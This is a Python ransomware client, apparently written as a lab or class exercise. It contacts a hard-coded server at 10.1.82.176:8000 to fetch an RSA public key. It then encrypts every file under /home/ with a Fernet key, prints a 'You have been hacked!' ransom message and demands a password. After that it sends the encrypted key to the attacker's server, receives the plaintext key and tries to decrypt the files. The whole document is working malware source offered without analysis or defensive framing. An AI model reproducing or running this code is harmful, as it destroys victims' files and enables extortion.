from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet

#SET UP SOCKET TO COMMUNICATE WITH SERVER
import socket

import os
import sys



HOST = "10.1.82.176"
PORT = 8000

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
	s.connect((HOST,PORT))
	
	s.send("it's rc_client".encode())
	
	#Make file to save to
	newfile = open('public_key.key', 'wb')
	
	#while True:
	#msg = s.recv(1024).decode()
	
	data = s.recv(1024)
	while(data):
		newfile.write(data)
		data = s.recv(1024)
	newfile.close()
	

symmetricKey  = Fernet.generate_key()

FernetInstance = Fernet(symmetricKey)



#ready the pub key from file
with open("/public_key.key", "rb") as key_file:
	public_key = serialization.load_pem_public_key(key_file.read(),
       			backend=default_backend()
        )

#encrypt sym key. changed sym key to fernetinstance. 
encryptedSymmetricKey = public_key.encrypt(
       symmetricKey, padding.OAEP(
           mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
           label=None
       )
   )

#save encrypted key
with open("/encryptedSymmertricKey.key", "wb") as key_file:
	key_file.write(encryptedSymmetricKey)

#filePath = "/home/michael/Desktop/client_data.txt"
walk_dir = "/home/"

for root, subdirs, files in os.walk(walk_dir):
	for filePath in files:

		fullFile = os.path.join(root, filePath)

		with open(fullFile, "rb") as file:
			file_data = file.read()
			encrypted_data = FernetInstance.encrypt(file_data)

		with open(fullFile, "wb") as file:
			file.write(encrypted_data)




def sendEncryptedKey(eKeyFilePath, s):
	#with socket.create_connection(("1.1.1.3", 8000)) as sock:
	with open(eKeyFilePath, "rb") as file:
		line = file.read(1024)
		while (line):
			s.send(line)
			line = file.read(1024)
#changed param key to passing in fernet instance

def decryptFile(filePath, sym_key):
	
	#FernetInstance = Fernet(key)
	"""
	with open(filePath, "w+b") as file:

		file_data = file.read() #was key param
		FernetInstance2 = Fernet(sym_key)
		decrypted_data = FernetInstance2.decrypt(file_data)
		file.write(decrypted_data)
		"""
	with open(filePath, "rb") as file:
		file_data = file.read()
		FernetInstance2 = Fernet(sym_key)
		decrypted_data = FernetInstance2.decrypt(file_data)
      
	with open(filePath, "wb") as file:
		file.write(decrypted_data)
		


with socket.create_connection((HOST, 8000)) as s:
	print("You have been hacked! You are now a ransomware victim...")
	s.send("it's decryptor".encode())
       	
	gave_pw = False
	while gave_pw != True:
		
		
		print("Enter password: ")
		guess = input()
		if guess == "Wahoo":
			gave_pw = True
			print("Correct! Decrypting...")
		else:
			print("WRONG!")
			
	#Send encrypted sym key to hacker
	sendEncryptedKey("/encryptedSymmertricKey.key", s)
	plaintext_sym_key = s.recv(2048)
	#print(type(plaintext_sym_key))
	#print(plaintext_sym_key)
	
	#DECRYPT FILE
	"""
	with open(filePath, "rb") as file:
		file_data = file.read()
		FernetInstance2 = Fernet(plaintext_sym_key)
		decrypted_data = FernetInstance2.decrypt(file_data)
      
	with open(filePath, "wb") as file:
		file.write(decrypted_data)
		"""

	for root, subdirs, files in os.walk(walk_dir):
		for filePath in files:
			decryptFile(filePath, plaintext_sym_key)

	#decryptFile("/home/michael/Desktop/client_data.txt", FernetInstance)
	
	print("Everything has now been restored. Be grateful I sent it back and say thank you! Cheers!")
	



          
